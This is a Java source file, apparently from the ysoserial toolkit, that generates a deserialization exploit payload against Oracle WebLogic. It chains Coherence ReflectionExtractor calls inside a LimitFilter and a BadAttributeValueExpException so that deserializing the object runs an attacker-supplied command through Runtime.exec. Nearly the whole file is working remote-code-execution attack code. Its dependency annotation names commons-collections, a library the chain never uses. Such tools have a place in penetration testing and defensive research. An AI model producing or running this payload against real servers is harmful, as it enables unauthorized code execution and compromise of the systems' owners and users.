package ysoserial.payloads;

import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;


import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
public class WebLogic extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public BadAttributeValueExpException getObject(String command) throws Exception {
        final String[] execArgs = new String[] { command };
        ReflectionExtractor extractor1 = new ReflectionExtractor(
            "getMethod",
            new Object[]{"getRuntime", new Class[0]}
        );
        ReflectionExtractor extractor2 = new ReflectionExtractor(
            "invoke",
            new Object[]{null, new Object[0]}

        );
        ReflectionExtractor extractor3 = new ReflectionExtractor(
            "exec",
            new Object[]{execArgs}
        );
        ReflectionExtractor[] extractors = {
            extractor1,
            extractor2,
            extractor3,
        };
        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        // BadAttributeValueExpException toString()
        // This only works in JDK 8u76 and WITHOUT a security manager
        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

       return badAttributeValueExpException;

    }
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(WebLogic.class, args);
    }

}
